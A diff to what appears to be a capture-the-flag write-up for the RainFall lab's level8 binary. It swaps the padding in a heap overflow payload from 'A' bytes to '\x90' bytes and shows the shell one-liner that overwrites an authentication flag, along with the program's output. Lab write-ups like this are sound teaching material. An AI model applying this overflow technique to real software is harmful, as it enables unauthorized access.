@@ -103,14 +103,14 @@ Let's craft our payload:
 "service" + padding
 "login"
 
-"auth \n" + "service" + "A"*16 + "\n" + "login\n"
+"auth \n" + "service" + "\x90"*16 + "\n" + "login\n"
 ```
 
 The `\n` are needed to simulate the user pressing the enter key, and it will also serve as the 17th character needed to overwrite `is_auth`.
 
 Let's run our payload:
 ```bash
-level8@RainFall:~$ (echo "auth "; python -c 'print("service" + "A"*16)'; echo "login"; cat) | ./level8
+level8@RainFall:~$ (echo "auth "; python -c 'print("service" + "\x90"*16)'; echo "login"; cat) | ./level8
 (nil), (nil)
 0x804a008, (nil)
 0x804a008, 0x804a018
